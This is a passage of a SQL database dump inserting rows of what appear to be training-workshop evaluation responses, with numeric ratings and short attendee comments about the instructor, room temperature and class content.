('evaluations', '147', 36, ''),
('evaluations', '147', 37, ''),
('evaluations', '147', 38, '0'),
('evaluations', '147', 39, '0'),
('evaluations', '148', 24, '1'),
('evaluations', '148', 25, '1'),
('evaluations', '148', 26, '1'),
('evaluations', '148', 27, '1'),
('evaluations', '148', 28, '2'),
('evaluations', '148', 30, '2'),
('evaluations', '148', 31, '1'),
('evaluations', '148', 32, '1'),
('evaluations', '148', 33, '1'),
('evaluations', '148', 34, '1'),
('evaluations', '148', 35, '1'),
('evaluations', '148', 36, ''),
('evaluations', '148', 37, ''),
('evaluations', '148', 38, '0'),
('evaluations', '148', 39, '0'),
('evaluations', '149', 24, '1'),
('evaluations', '149', 25, '0'),
('evaluations', '149', 26, '1'),
('evaluations', '149', 27, '0'),
('evaluations', '149', 28, '2'),
('evaluations', '149', 30, '2'),
('evaluations', '149', 31, '0'),
('evaluations', '149', 32, '1'),
('evaluations', '149', 33, '1'),
('evaluations', '149', 34, '0'),
('evaluations', '149', 35, '0'),
('evaluations', '149', 36, ''),
('evaluations', '149', 37, ''),
('evaluations', '149', 38, '1'),
('evaluations', '149', 39, '0'),
('evaluations', '150', 24, '0'),
('evaluations', '150', 25, '0'),
('evaluations', '150', 26, '3'),
('evaluations', '150', 27, '1'),
('evaluations', '150', 28, '2'),
('evaluations', '150', 30, '1'),
('evaluations', '150', 31, '0'),
('evaluations', '150', 32, '1'),
('evaluations', '150', 33, '1'),
('evaluations', '150', 34, '1'),
('evaluations', '150', 35, '1'),
('evaluations', '150', 36, ''),
('evaluations', '150', 37, ''),
('evaluations', '150', 38, '1'),
('evaluations', '150', 39, '1'),
('evaluations', '151', 24, '0'),
('evaluations', '151', 25, '0'),
('evaluations', '151', 26, '0'),
('evaluations', '151', 27, '0'),
('evaluations', '151', 28, '2'),
('evaluations', '151', 30, '2'),
('evaluations', '151', 31, '0'),
('evaluations', '151', 32, '0'),
('evaluations', '151', 33, '0'),
('evaluations', '151', 34, '0'),
('evaluations', '151', 35, '0'),
('evaluations', '151', 36, ''),
('evaluations', '151', 37, ''),
('evaluations', '151', 38, '0'),
('evaluations', '151', 39, '0'),
('evaluations', '152', 24, '0'),
('evaluations', '152', 25, '0'),
('evaluations', '152', 26, '0'),
('evaluations', '152', 27, '0'),
('evaluations', '152', 28, '2'),
('evaluations', '152', 30, '2'),
('evaluations', '152', 31, '0'),
('evaluations', '152', 32, '0'),
('evaluations', '152', 33, '0'),
('evaluations', '152', 34, '0'),
('evaluations', '152', 35, '0'),
('evaluations', '152', 36, 'Twanda did a great job!'),
('evaluations', '152', 37, ''),
('evaluations', '152', 38, '1'),
('evaluations', '152', 39, '0'),
('evaluations', '153', 24, '0'),
('evaluations', '153', 25, '0'),
('evaluations', '153', 26, '0'),
('evaluations', '153', 27, '0'),
('evaluations', '153', 28, '2'),
('evaluations', '153', 30, '2'),
('evaluations', '153', 31, '1'),
('evaluations', '153', 32, '1'),
('evaluations', '153', 33, '1'),
('evaluations', '153', 34, '0'),
('evaluations', '153', 35, '0'),
('evaluations', '153', 36, 'The workshop was fine just the way it was.'),
('evaluations', '153', 37, 'It worked great.'),
('evaluations', '153', 38, '0'),
('evaluations', '153', 39, '0'),
('evaluations', '154', 24, '0'),
('evaluations', '154', 25, '0'),
('evaluations', '154', 26, '1'),
('evaluations', '154', 27, '1'),
('evaluations', '154', 28, '2'),
('evaluations', '154', 30, '2'),
('evaluations', '154', 31, '0'),
('evaluations', '154', 32, '0'),
('evaluations', '154', 33, '0'),
('evaluations', '154', 34, '0'),
('evaluations', '154', 35, '0'),
('evaluations', '154', 36, 'Not sure.'),
('evaluations', '154', 37, 'Expandable view for "My Appointment" or easy way to export to Outlook would be handy.'),
('evaluations', '154', 38, '0'),
('evaluations', '154', 39, '0'),
('evaluations', '155', 24, '1'),
('evaluations', '155', 25, '1'),
('evaluations', '155', 26, '1'),
('evaluations', '155', 27, '0'),
('evaluations', '155', 28, '2'),
('evaluations', '155', 30, '2'),
('evaluations', '155', 31, '1'),
('evaluations', '155', 32, '0'),
('evaluations', '155', 33, '1'),
('evaluations', '155', 34, '0'),
('evaluations', '155', 35, '1'),
('evaluations', '155', 36, 'Make break 10 mins instead of 5 and bring chocolate!'),
('evaluations', '155', 37, 'It is efficient.'),
('evaluations', '155', 38, '1'),
('evaluations', '155', 39, '0'),
('evaluations', '156', 24, '0'),
('evaluations', '156', 25, '0'),
('evaluations', '156', 26, '0'),
('evaluations', '156', 27, '0'),
('evaluations', '156', 28, '2'),
('evaluations', '156', 30, '2'),
('evaluations', '156', 31, '0'),
('evaluations', '156', 32, '0'),
('evaluations', '156', 33, '0'),
('evaluations', '156', 34, '0'),
('evaluations', '156', 35, '0'),
('evaluations', '156', 36, 'It was great!  Twanda is a very good instructor.'),
('evaluations', '156', 37, 'none'),
('evaluations', '156', 38, '0'),
('evaluations', '156', 39, '0'),
('evaluations', '157', 24, '0'),
('evaluations', '157', 25, '0'),
('evaluations', '157', 26, '0'),
('evaluations', '157', 27, '0'),
('evaluations', '157', 28, '2'),
('evaluations', '157', 30, '2'),
('evaluations', '157', 31, '0'),
('evaluations', '157', 32, '0'),
('evaluations', '157', 33, '0'),
('evaluations', '157', 34, '0'),
('evaluations', '157', 35, '0'),
('evaluations', '157', 36, ''),
('evaluations', '157', 37, ''),
('evaluations', '157', 38, '0'),
('evaluations', '157', 39, '0'),
('evaluations', '158', 24, '1'),
('evaluations', '158', 25, '1'),
('evaluations', '158', 26, '1'),
('evaluations', '158', 27, '0'),
('evaluations', '158', 28, '2'),
('evaluations', '158', 30, '2'),
('evaluations', '158', 31, '0'),
('evaluations', '158', 32, '1'),
('evaluations', '158', 33, '1'),
('evaluations', '158', 34, '1'),
('evaluations', '158', 35, '0'),
('evaluations', '158', 36, 'I''m satisfied.'),
('evaluations', '158', 37, ''),
('evaluations', '158', 38, '0'),
('evaluations', '158', 39, '1'),
('evaluations', '159', 24, '0'),
('evaluations', '159', 25, '0'),
('evaluations', '159', 26, '0'),
('evaluations', '159', 27, '0'),
('evaluations', '159', 28, '2'),
('evaluations', '159', 30, '1'),
('evaluations', '159', 31, '0'),
('evaluations', '159', 32, '0'),
('evaluations', '159', 33, '0'),
('evaluations', '159', 34, '0'),
('evaluations', '159', 35, '0'),
('evaluations', '159', 36, ''),
('evaluations', '159', 37, ''),
('evaluations', '159', 38, '0'),
('evaluations', '159', 39, '0'),
('evaluations', '160', 24, '0'),
('evaluations', '160', 25, '0'),
('evaluations', '160', 26, '0'),
('evaluations', '160', 27, '0'),
('evaluations', '160', 28, '2'),
('evaluations', '160', 30, '2'),
('evaluations', '160', 31, '0'),
('evaluations', '160', 32, '0'),
('evaluations', '160', 33, '0'),
('evaluations', '160', 34, '0'),
('evaluations', '160', 35, '0'),
('evaluations', '160', 36, 'Offer Microsoft Word 2007 classes'),
('evaluations', '160', 37, ''),
('evaluations', '160', 38, '0'),
('evaluations', '160', 39, '0'),
('evaluations', '161', 24, '0'),
('evaluations', '161', 25, '0'),
('evaluations', '161', 26, '0'),
('evaluations', '161', 27, '0'),
('evaluations', '161', 28, '2'),
('evaluations', '161', 30, '2'),
('evaluations', '161', 31, '0'),
('evaluations', '161', 32, '0'),
('evaluations', '161', 33, '0'),
('evaluations', '161', 34, '0'),
('evaluations', '161', 35, '0'),
('evaluations', '161', 36, ''),
('evaluations', '161', 37, ''),
('evaluations', '161', 38, '1'),
('evaluations', '161', 39, '0'),
('evaluations', '163', 24, '0'),
('evaluations', '163', 25, '0'),
('evaluations', '163', 26, '0'),
('evaluations', '163', 27, '0'),
('evaluations', '163', 28, '2'),
('evaluations', '163', 30, '2'),
('evaluations', '163', 31, '1'),
('evaluations', '163', 32, '0'),
('evaluations', '163', 33, '0'),
('evaluations', '163', 34, '0'),
('evaluations', '163', 35, '0'),
('evaluations', '163', 36, ''),
('evaluations', '163', 37, ''),
('evaluations', '163', 38, '0'),
('evaluations', '163', 39, '0'),
('evaluations', '164', 24, '0'),
('evaluations', '164', 25, '0'),
('evaluations', '164', 26, '0'),
('evaluations', '164', 27, '0'),
('evaluations', '164', 28, '2'),
('evaluations', '164', 30, '2'),
('evaluations', '164', 31, '1'),
('evaluations', '164', 32, '0'),
('evaluations', '164', 33, '0'),
('evaluations', '164', 34, '0'),
('evaluations', '164', 35, '0'),
('evaluations', '164', 36, ''),
('evaluations', '164', 37, ''),
('evaluations', '164', 38, '0'),
('evaluations', '164', 39, '0'),
('evaluations', '165', 24, '1'),
('evaluations', '165', 25, '0'),
('evaluations', '165', 26, '0'),
('evaluations', '165', 27, '0'),
('evaluations', '165', 28, '2'),
('evaluations', '165', 30, '2'),
('evaluations', '165', 31, '1'),
('evaluations', '165', 32, '1'),
('evaluations', '165', 33, '1'),
('evaluations', '165', 34, '0'),
('evaluations', '165', 35, '1'),
('evaluations', '165', 36, ''),
('evaluations', '165', 37, ''),
('evaluations', '165', 38, '1'),
('evaluations', '165', 39, '1'),
('evaluations', '166', 24, '1'),
('evaluations', '166', 25, '0'),
('evaluations', '166', 26, '0'),
('evaluations', '166', 27, '0'),
('evaluations', '166', 28, '1'),
('evaluations', '166', 30, '2'),
('evaluations', '166', 31, '0'),
('evaluations', '166', 32, '1'),
('evaluations', '166', 33, '1'),
('evaluations', '166', 34, '1'),
('evaluations', '166', 35, '0'),
('evaluations', '166', 36, ''),
('evaluations', '166', 37, ''),
('evaluations', '166', 38, '1'),
('evaluations', '166', 39, '0'),
('evaluations', '167', 24, '1'),
('evaluations', '167', 25, '1'),
('evaluations', '167', 26, '1'),
('evaluations', '167', 27, '0'),
('evaluations', '167', 28, '2'),
('evaluations', '167', 30, '2'),
('evaluations', '167', 31, '0'),
('evaluations', '167', 32, '1'),
('evaluations', '167', 33, '1'),
('evaluations', '167', 34, '1'),
('evaluations', '167', 35, '1'),
('evaluations', '167', 36, 'Get someone to turn the therostat up in the room.  It was pretty cold.'),
('evaluations', '167', 37, ''),
('evaluations', '167', 38, '1'),
('evaluations', '167', 39, '1'),
('evaluations', '168', 24, '0'),
('evaluations', '168', 25, '0'),
('evaluations', '168', 26, '0'),
('evaluations', '168', 27, '0'),
('evaluations', '168', 28, '2'),
('evaluations', '168', 30, '0'),
('evaluations', '168', 31, '0'),
('evaluations', '168', 32, '0'),
('evaluations', '168', 33, '0'),
('evaluations', '168', 34, '0'),
('evaluations', '168', 35, '0'),
('evaluations', '168', 36, ''),
('evaluations', '168', 37, ''),
('evaluations', '168', 38, '0'),
('evaluations', '168', 39, '0'),
('evaluations', '169', 24, '0'),
('evaluations', '169', 25, '0'),
('evaluations', '169', 26, '0'),
('evaluations', '169', 27, '0'),
('evaluations', '169', 28, '2'),
('evaluations', '169', 30, '2'),
('evaluations', '169', 31, '0'),
('evaluations', '169', 32, '0'),
('evaluations', '169', 33, '0'),
('evaluations', '169', 34, '0'),
('evaluations', '169', 35, '0'),
('evaluations', '169', 36, 'Heat the classroom!'),
('evaluations', '169', 37, ''),
('evaluations', '169', 38, '1'),
('evaluations', '169', 39, '0'),
('evaluations', '170', 24, '1'),
('evaluations', '170', 25, '1'),
('evaluations', '170', 26, '1'),
('evaluations', '170', 27, '1'),
('evaluations', '170', 28, '2'),
('evaluations', '170', 30, '2'),
('evaluations', '170', 31, '1'),
('evaluations', '170', 32, '1'),
('evaluations', '170', 33, '1'),
('evaluations', '170', 34, '1'),
('evaluations', '170', 35, '1'),
('evaluations', '170', 36, 'the room was too cold!'),
('evaluations', '170', 37, ''),
('evaluations', '170', 38, '1'),
('evaluations', '170', 39, '1'),
('evaluations', '171', 24, '1'),
('evaluations', '171', 25, '1'),
('evaluations', '171', 26, '1'),
('evaluations', '171', 27, '1'),
('evaluations', '171', 28, '2'),
('evaluations', '171', 30, '2'),
('evaluations', '171', 31, '1'),
('evaluations', '171', 32, '1'),
('evaluations', '171', 33, '1'),
('evaluations', '171', 34, '1'),
('evaluations', '171', 35, '1'),
('evaluations', '171', 36, ''),
('evaluations', '171', 37, ''),
('evaluations', '171', 38, '0'),
('evaluations', '171', 39, '0'),
('evaluations', '172', 24, '1'),
('evaluations', '172', 25, '0'),
('evaluations', '172', 26, '0'),
('evaluations', '172', 27, '0'),
('evaluations', '172', 28, '2'),
('evaluations', '172', 30, '2'),
('evaluations', '172', 31, '0'),
('evaluations', '172', 32, '0'),
('evaluations', '172', 33, '4'),
('evaluations', '172', 34, '0'),
('evaluations', '172', 35, '0'),
('evaluations', '172', 36, 'Room was too cold.'),
('evaluations', '172', 37, 'Very nice!'),
('evaluations', '172', 38, '0'),
('evaluations', '172', 39, '0'),
('evaluations', '173', 24, '1'),
('evaluations', '173', 25, '0'),
('evaluations', '173', 26, '0'),
('evaluations', '173', 27, '0'),
('evaluations', '173', 28, '0'),
('evaluations', '173', 30, '1'),
('evaluations', '173', 31, '1'),
('evaluations', '173', 32, '0'),
('evaluations', '173', 33, '1'),
('evaluations', '173', 34, '1'),
('evaluations', '173', 35, '1'),
('evaluations', '173', 36, 'Needs a little more voerview, expecially for non-technical members of the audience. Too much material to cover in the time available.'),
('evaluations', '173', 37, 'None'),
('evaluations', '173', 38, '1'),
('evaluations', '173', 39, '1'),
('evaluations', '174', 36, ''),
('evaluations', '174', 37, ''),
('evaluations', '175', 24, '0'),
('evaluations', '175', 25, '0'),
('evaluations', '175', 26, '0'),
('evaluations', '175', 27, '0'),
('evaluations', '175', 28, '2'),
('evaluations', '175', 30, '2'),
('evaluations', '175', 31, '1'),
('evaluations', '175', 32, '1'),
('evaluations', '175', 33, '1'),
('evaluations', '175', 34, '0'),
('evaluations', '175', 35, '1'),
('evaluations', '175', 36, ''),
('evaluations', '175', 37, ''),
('evaluations', '175', 38, '0'),
('evaluations', '175', 39, '0'),
('evaluations', '176', 24, '0'),
('evaluations', '176', 25, '0'),
('evaluations', '176', 26, '0'),
('evaluations', '176', 27, '0'),
('evaluations', '176', 28, '0'),
('evaluations', '176', 30, '1'),
('evaluations', '176', 31, '0'),
('evaluations', '176', 32, '1'),
('evaluations', '176', 33, '4'),
('evaluations', '176', 34, '0'),
('evaluations', '176', 35, '1'),
('evaluations', '176', 36, ''),
('evaluations', '176', 37, ''),
('evaluations', '176', 38, '0'),
('evaluations', '176', 39, '1'),
('evaluations', '177', 24, '1'),
('evaluations', '177', 25, '0'),
('evaluations', '177', 26, '0'),
('evaluations', '177', 27, '0'),
('evaluations', '177', 28, '2'),
('evaluations', '177', 30, '2'),
('evaluations', '177', 31, '1'),
('evaluations', '177', 32, '1'),
('evaluations', '177', 33, '4'),
('evaluations', '177', 34, '0'),
('evaluations', '177', 35, '1'),
('evaluations', '177', 36, ''),
('evaluations', '177', 37, ''),
('evaluations', '177', 38, '1'),
('evaluations', '177', 39, '1'),
('evaluations', '178', 24, '0'),
('evaluations', '178', 25, '0'),
('evaluations', '178', 26, '0'),
('evaluations', '178', 27, '0'),
('evaluations', '178', 28, '2'),
('evaluations', '178', 30, '2'),
('evaluations', '178', 31, '0'),
('evaluations', '178', 32, '0'),
('evaluations', '178', 33, '0'),
('evaluations', '178', 34, '0'),
('evaluations', '178', 35, '0'),
('evaluations', '178', 36, 'I was very pleased with the workshop, very informative!'),
('evaluations', '178', 37, 'It is very easy to use.'),
('evaluations', '178', 38, '1'),
('evaluations', '178', 39, '0'),
('evaluations', '179', 24, '1'),
('evaluations', '179', 25, '1'),
('evaluations', '179', 26, '1'),
('evaluations', '179', 27, '1'),
('evaluations', '179', 28, '2'),
('evaluations', '179', 30, '0'),
('evaluations', '179', 31, '1'),
('evaluations', '179', 32, '1'),
('evaluations', '179', 33, '1'),
('evaluations', '179', 34, '1'),
('evaluations', '179', 35, '2'),
('evaluations', '179', 36, 'I do not need to know installation detail page by page for each plateform or application, since I am not going to remember it'),
('evaluations', '179', 37, ''),
('evaluations', '179', 38, '0'),
('evaluations', '179', 39, '0'),
('evaluations', '180', 24, '1'),
('evaluations', '180', 25, '1'),
('evaluations', '180', 26, '1'),
('evaluations', '180', 27, '1'),
('evaluations', '180', 28, '0'),
('evaluations', '180', 30, '1'),
('evaluations', '180', 31, '1'),
('evaluations', '180', 32, '1'),
('evaluations', '180', 33, '4'),
('evaluations', '180', 34, '1'),
('evaluations', '180', 35, '1'),
('evaluations', '180', 36, ''),
('evaluations', '180', 37, ''),
('evaluations', '180', 38, '1'),
('evaluations', '180', 39, '1'),
('evaluations', '181', 24, '1'),
('evaluations', '181', 25, '1'),
('evaluations', '181', 26, '0'),
('evaluations', '181', 27, '1'),
('evaluations', '181', 28, '2'),
('evaluations', '181', 30, '2'),
('evaluations', '181', 31, '0'),
('evaluations', '181', 32, '1'),
('evaluations', '181', 33, '0'),
('evaluations', '181', 34, '1'),
('evaluations', '181', 35, '1'),
('evaluations', '181', 36, ''),
('evaluations', '181', 37, ''),
('evaluations', '181', 38, '1'),
('evaluations', '181', 39, '0'),
('evaluations', '182', 24, '0'),
('evaluations', '182', 25, '0'),
('evaluations', '182', 26, '0'),
('evaluations', '182', 27, '0'),
('evaluations', '182', 28, '2'),
('evaluations', '182', 30, '2'),
('evaluations', '182', 31, '0'),
('evaluations', '182', 32, '0'),
('evaluations', '182', 33, '0'),
('evaluations', '182', 34, '0'),
('evaluations', '182', 35, '0'),
('evaluations', '182', 36, 'It may be helpful to divide the class up based on experience level of the attendees.  Someone with no exposure to PPT may need a little more help, but it worked for me because I''ve used it before.'),
('evaluations', '182', 37, 'n/a'),
('evaluations', '182', 38, '0'),
('evaluations', '182', 39, '0'),
('evaluations', '183', 24, '0'),
('evaluations', '183', 25, '0'),
('evaluations', '183', 26, '1'),
('evaluations', '183', 27, '0'),
('evaluations', '183', 28, '2'),
('evaluations', '183', 30, '2'),
('evaluations', '183', 31, '0'),
('evaluations', '183', 32, '0'),
('evaluations', '183', 33, '0'),
('evaluations', '183', 34, '0'),
('evaluations', '183', 35, '0'),
('evaluations', '183', 36, ''),
('evaluations', '183', 37, ''),
('evaluations', '183', 38, '0'),
('evaluations', '183', 39, '0'),
('evaluations', '184', 24, '1'),
('evaluations', '184', 25, '0'),
('evaluations', '184', 26, '1'),
('evaluations', '184', 27, '1'),
('evaluations', '184', 28, '2'),
('evaluations', '184', 30, '2'),
('evaluations', '184', 31, '0'),
('evaluations', '184', 32, '1'),
('evaluations', '184', 33, '1'),
('evaluations', '184', 34, '1'),
('evaluations', '184', 35, '0'),
('evaluations', '184', 36, ''),
('evaluations', '184', 37, ''),
('evaluations', '184', 38, '1'),
('evaluations', '184', 39, '1'),
('evaluations', '185', 24, '0'),
('evaluations', '185', 25, '1'),
('evaluations', '185', 26, '1'),
('evaluations', '185', 27, '1'),
('evaluations', '185', 28, '2'),
('evaluations', '185', 30, '1'),
('evaluations', '185', 31, '0'),
('evaluations', '185', 32, '1'),
('evaluations', '185', 33, '1'),
('evaluations', '185', 34, '1'),
('evaluations', '185', 35, '1'),
('evaluations', '185', 36, 'time to practice a few more of the many features'),
('evaluations', '185', 37, ''),
('evaluations', '185', 38, '1'),
('evaluations', '185', 39, '1'),
('evaluations', '186', 24, '0'),
('evaluations', '186', 25, '0'),
('evaluations', '186', 26, '0'),
('evaluations', '186', 27, '0'),
('evaluations', '186', 28, '2'),
('evaluations', '186', 30, '2'),
('evaluations', '186', 31, '0'),
('evaluations', '186', 32, '0'),
('evaluations', '186', 33, '0'),
('evaluations', '186', 34, '0'),
('evaluations', '186', 35, '0'),
('evaluations', '186', 36, 'Can''t think of anything.'),
('evaluations', '186', 37, 'Address wrong--building #\r\n#### Stinson Drive (please check, I don''t have notes with me right now)'),
('evaluations', '186', 38, '0'),
('evaluations', '186', 39, '0'),
('evaluations', '187', 24, '1'),
('evaluations', '187', 25, '1'),
('evaluations', '187', 26, '1'),
('evaluations', '187', 27, '1'),
('evaluations', '187', 28, '0'),
('evaluations', '187', 30, '1'),
('evaluations', '187', 31, '1'),
('evaluations', '187', 32, '1'),
('evaluations', '187', 33, '1'),
('evaluations', '187', 34, '1'),
('evaluations', '187', 35, '1'),
('evaluations', '187', 36, ''),
('evaluations', '187', 37, ''),
('evaluations', '187', 38, '1'),
('evaluations', '187', 39, '1'),
('evaluations', '188', 24, '1'),
('evaluations', '188', 25, '0'),
('evaluations', '188', 26, '1'),
('evaluations', '188', 27, '1'),
('evaluations', '188', 28, '2'),
('evaluations', '188', 30, '2'),
('evaluations', '188', 31, '1'),
('evaluations', '188', 32, '1'),
('evaluations', '188', 33, '1'),
('evaluations', '188', 34, '0'),
('evaluations', '188', 35, '0'),
('evaluations', '188', 36, ''),
('evaluations', '188', 37, ''),
('evaluations', '188', 38, '0'),
('evaluations', '188', 39, '0'),
('evaluations', '189', 24, '0'),
('evaluations', '189', 25, '0'),
('evaluations', '189', 26, '0'),
('evaluations', '189', 27, '0'),
('evaluations', '189', 28, '2'),
('evaluations', '189', 30, '2'),
('evaluations', '189', 31, '0'),
('evaluations', '189', 32, '1'),
('evaluations', '189', 33, '0'),
('evaluations', '189', 34, '0'),
('evaluations', '189', 35, '0'),
('evaluations', '189', 36, ''),
('evaluations', '189', 37, ''),
('evaluations', '189', 38, '1'),
('evaluations', '189', 39, '1'),
('evaluations', '190', 24, '0'),
('evaluations', '190', 25, '0'),
('evaluations', '190', 26, '0'),
('evaluations', '190', 27, '0'),
('evaluations', '190', 28, '2'),
('evaluations', '190', 30, '2'),
('evaluations', '190', 31, '0'),
('evaluations', '190', 32, '0'),
('evaluations', '190', 33, '0'),
('evaluations', '190', 34, '0'),
('evaluations', '190', 35, '0'),
('evaluations', '190', 36, ''),
('evaluations', '190', 37, ''),
('evaluations', '190', 38, '0'),
('evaluations', '190', 39, '0'),
('evaluations', '191', 24, '0'),
('evaluations', '191', 25, '0'),
('evaluations', '191', 26, '0'),
('evaluations', '191', 27, '0'),
('evaluations', '191', 28, '2'),
('evaluations', '191', 30, '2'),
('evaluations', '191', 31, '0'),
('evaluations', '191', 32, '0'),
('evaluations', '191', 33, '0'),
('evaluations', '191', 34, '0'),
('evaluations', '191', 35, '0'),
('evaluations', '191', 36, 'Provide a certificate to show the person has attended the class.  It can be a pdf file, so it can be placed in the person''s personnel file or training files.'),
('evaluations', '191', 37, ''),
('evaluations', '191', 38, '0'),
('evaluations', '191', 39, '0'),
('evaluations', '192', 24, '1'),
('evaluations', '192', 25, '1'),
('evaluations', '192', 26, '0'),
('evaluations', '192', 27, '0'),
('evaluations', '192', 28, '1'),
('evaluations', '192', 30, '2'),
('evaluations', '192', 31, '1'),
('evaluations', '192', 32, '0'),
('evaluations', '192', 33, '0'),
('evaluations', '192', 34, '1'),
('evaluations', '192', 35, '0'),
('evaluations', '192', 36, ''),
('evaluations', '192', 37, 'The links for handouts are sometimes problematic.'),
('evaluations', '192', 38, '0'),
('evaluations', '192', 39, '0'),
('evaluations', '193', 24, '1'),
('evaluations', '193', 25, '1'),
('evaluations', '193', 26, '1'),
('evaluations', '193', 27, '1'),
('evaluations', '193', 28, '2'),
('evaluations', '193', 30, '2'),
('evaluations', '193', 31, '1'),
('evaluations', '193', 32, '1'),
('evaluations', '193', 33, '1'),
('evaluations', '193', 34, '1'),
('evaluations', '193', 35, '1'),
('evaluations', '193', 36, 'serving breakfast!'),
('evaluations', '193', 37, ''),
('evaluations', '193', 38, '0'),
('evaluations', '193', 39, '0'),
('evaluations', '195', 24, '1'),
('evaluations', '195', 25, '1'),
('evaluations', '195', 26, '1'),
('evaluations', '195', 27, '1'),
('evaluations', '195', 28, '2'),
('evaluations', '195', 30, '2'),
('evaluations', '195', 31, '1'),
('evaluations', '195', 32, '1'),
('evaluations', '195', 33, '1'),
('evaluations', '195', 34, '1'),
('evaluations', '195', 35, '1'),
('evaluations', '195', 36, ''),
('evaluations', '195', 37, ''),
('evaluations', '195', 38, '0'),
('evaluations', '195', 39, '0'),
('evaluations', '196', 24, '0'),
('evaluations', '196', 25, '0'),
('evaluations', '196', 26, '0'),
('evaluations', '196', 27, '0'),
('evaluations', '196', 28, '2'),
('evaluations', '196', 30, '2'),
('evaluations', '196', 31, '0'),
('evaluations', '196', 32, '0'),
('evaluations', '196', 33, '0'),
('evaluations', '196', 34, '0'),
('evaluations', '196', 35, '0'),
('evaluations', '196', 36, 'Coffee'),
('evaluations', '196', 37, ''),
('evaluations', '196', 38, '0'),
('evaluations', '196', 39, '0'),
('evaluations', '197', 24, '0'),
('evaluations', '197', 25, '0'),
('evaluations', '197', 26, '0'),
('evaluations', '197', 27, '0'),
('evaluations', '197', 28, '2'),
('evaluations', '197', 30, '2'),
('evaluations', '197', 31, '1'),
('evaluations', '197', 32, '1'),
('evaluations', '197', 33, '4'),
('evaluations', '197', 34, '0'),
('evaluations', '197', 35, '0'),
('evaluations', '197', 36, ''),
('evaluations', '197', 37, ''),
('evaluations', '197', 38, '0'),
('evaluations', '197', 39, '0'),
('evaluations', '198', 24, '1'),
('evaluations', '198', 25, '1'),
('evaluations', '198', 26, '1'),
('evaluations', '198', 27, '1'),
('evaluations', '198', 28, '2'),
('evaluations', '198', 30, '2'),
('evaluations', '198', 31, '1'),
('evaluations', '198', 32, '1'),
('evaluations', '198', 33, '1'),
('evaluations', '198', 34, '1'),
('evaluations', '198', 35, '1'),
('evaluations', '198', 36, ''),
('evaluations', '198', 37, ''),
('evaluations', '198', 38, '1'),
('evaluations', '198', 39, '0'),
('evaluations', '199', 24, '0'),
('evaluations', '199', 25, '0'),
('evaluations', '199', 26, '0'),
('evaluations', '199', 27, '0'),
('evaluations', '199', 28, '0'),
('evaluations', '199', 30, '2'),
('evaluations', '199', 31, '1'),
('evaluations', '199', 32, '1'),
('evaluations', '199', 33, '1'),
('evaluations', '199', 34, '0'),
('evaluations', '199', 35, '1'),
('evaluations', '199', 36, ''),
('evaluations', '199', 37, ''),
('evaluations', '199', 38, '0'),
('evaluations', '199', 39, '0'),
('evaluations', '200', 24, '1'),
('evaluations', '200', 25, '1'),
('evaluations', '200', 26, '1'),
('evaluations', '200', 27, '1'),
('evaluations', '200', 28, '2'),
('evaluations', '200', 30, '2'),
('evaluations', '200', 31, '1'),
('evaluations', '200', 32, '1'),
('evaluations', '200', 33, '4'),
('evaluations', '200', 34, '1'),
('evaluations', '200', 35, '1'),
('evaluations', '200', 36, ''),
('evaluations', '200', 37, ''),
('evaluations', '200', 38, '0'),
('evaluations', '200', 39, '1'),
('evaluations', '201', 24, '0'),
('evaluations', '201', 25, '0'),
('evaluations', '201', 26, '0'),
('evaluations', '201', 27, '0'),
('evaluations', '201', 28, '2'),
('evaluations', '201', 30, '2'),
('evaluations', '201', 31, '0'),
('evaluations', '201', 32, '1'),
('evaluations', '201', 33, '1'),
('evaluations', '201', 34, '0'),
('evaluations', '201', 35, '0'),
('evaluations', '201', 36, ''),
('evaluations', '201', 37, ''),
('evaluations', '201', 38, '0'),
('evaluations', '201', 39, '0'),
('evaluations', '202', 24, '1'),
('evaluations', '202', 25, '1'),
('evaluations', '202', 26, '1'),
('evaluations', '202', 27, '1'),
('evaluations', '202', 28, '2'),
('evaluations', '202', 30, '2'),
('evaluations', '202', 31, '1'),
('evaluations', '202', 32, '4'),
('evaluations', '202', 33, '1'),
('evaluations', '202', 34, '1'),
('evaluations', '202', 35, '1'),
('evaluations', '202', 36, ''),
('evaluations', '202', 37, 'too cold'),
('evaluations', '202', 38, '1'),
('evaluations', '202', 39, '1'),
('evaluations', '203', 24, '1'),
('evaluations', '203', 25, '1'),
('evaluations', '203', 26, '1'),
('evaluations', '203', 27, '0'),
('evaluations', '203', 28, '2'),
('evaluations', '203', 30, '2'),
('evaluations', '203', 31, '0'),
('evaluations', '203', 32, '1'),
('evaluations', '203', 33, '1'),
('evaluations', '203', 34, '1'),
('evaluations', '203', 35, '1'),
('evaluations', '203', 36, ''),
('evaluations', '203', 37, ''),
('evaluations', '203', 38, '0'),
('evaluations', '203', 39, '0'),
('evaluations', '204', 24, '1'),
('evaluations', '204', 25, '1'),
('evaluations', '204', 26, '1'),
('evaluations', '204', 27, '1'),
('evaluations', '204', 28, '2'),
('evaluations', '204', 30, '2'),
('evaluations', '204', 31, '1'),
('evaluations', '204', 32, '1'),
('evaluations', '204', 33, '1'),
('evaluations', '204', 34, '1'),
('evaluations', '204', 35, '1'),
('evaluations', '204', 36, ''),
('evaluations', '204', 37, ''),
('evaluations', '204', 38, '0'),
('evaluations', '204', 39, '0'),
('evaluations', '205', 24, '1'),
('evaluations', '205', 25, '0'),
('evaluations', '205', 26, '0'),
('evaluations', '205', 27, '0'),
('evaluations', '205', 28, '1'),
('evaluations', '205', 30, '2'),
('evaluations', '205', 31, '1'),
('evaluations', '205', 32, '1'),
('evaluations', '205', 33, '1'),
('evaluations', '205', 34, '0');
INSERT INTO `oit_tbl_ot_custom_attribute_value` (`objectId`, `parentId`, `attributeId`, `value`) VALUES
('evaluations', '205', 35, '1'),
('evaluations', '205', 36, 'This class was geared towards beginners a little to much for me.  The class I would have liked to take was full.'),
('evaluations', '205', 37, 'More advanced notice on waitlist status.\r\nClasses fill up quickly.'),
('evaluations', '205', 38, '1'),
('evaluations', '205', 39, '1'),
('evaluations', '206', 24, '0'),
('evaluations', '206', 25, '0'),
('evaluations', '206', 26, '0'),
('evaluations', '206', 27, '0'),
('evaluations', '206', 28, '2'),
('evaluations', '206', 30, '1'),
('evaluations', '206', 31, '1'),
('evaluations', '206', 32, '0'),
('evaluations', '206', 33, '0'),
('evaluations', '206', 34, '0'),
('evaluations', '206', 35, '0'),
('evaluations', '206', 36, ''),
('evaluations', '206', 37, ''),
('evaluations', '206', 38, '1'),
('evaluations', '206', 39, '0'),
('evaluations', '207', 24, '0'),
('evaluations', '207', 25, '0'),
('evaluations', '207', 26, '0'),
('evaluations', '207', 27, '0'),
('evaluations', '207', 28, '2'),
('evaluations', '207', 30, '2'),
('evaluations', '207', 31, '1'),
